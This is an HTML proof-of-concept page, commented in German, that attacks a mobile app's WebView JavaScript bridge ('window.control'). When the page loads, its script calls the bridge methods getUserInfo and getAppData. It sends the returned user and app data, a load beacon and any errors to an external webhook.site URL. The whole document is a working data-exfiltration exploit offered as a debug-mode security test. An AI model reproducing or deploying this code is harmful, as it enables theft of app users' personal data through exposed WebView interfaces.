<!DOCTYPE html>
<html>
<head>
    <title>OSL Ultimate PoC</title>
</head>
<body>
    <h1>OSL App Security PoC - Debug Mode</h1>
    <div id="status">Starte Exploit...</div>

    <script>
        const WEBHOOK = 'https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d';

        // 1. Sofortiges Lebenszeichen: Wir beweisen, dass die Seite geladen wurde!
        fetch(WEBHOOK, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({ stage: "1_page_loaded", message: "Die Seite wurde im OSL-WebView geladen!" })
        });

        // Callback-Funktionen für die App bereitstellen
        window.handleUserInfo = function(data) {
            fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ stage: "3_userInfo_received", payload: data })
            });
        };

        window.handleAppData = function(data) {
            fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ stage: "3_appData_received", payload: data })
            });
        };

        // 2. Ausführung der Bridge-Befehle im geschützten Try-Catch
        setTimeout(function() {
            if (window.control) {
                document.getElementById('status').innerText = "Bridge gefunden. Rufe Methoden auf...";
                
                // Versuch 1: Aufruf mit Callback-Name als String-Argument (weil die Java-Methode einen String erwartet)
                try {
                    window.control.getUserInfo("handleUserInfo");
                } catch(e) {
                    fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ stage: "error_getUserInfo", msg: e.message }) });
                }

                try {
                    window.control.getAppData("handleAppData");
                } catch(e) {
                    fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ stage: "error_getAppData", msg: e.message }) });
                }

            } else {
                document.getElementById('status').innerText = "Keine Bridge (window.control) gefunden.";
                fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ stage: "2_no_bridge" }) });
            }
        }, 1000); // 1 Sekunde warten, damit die Bridge sicher initialisiert ist
    </script>
</body>
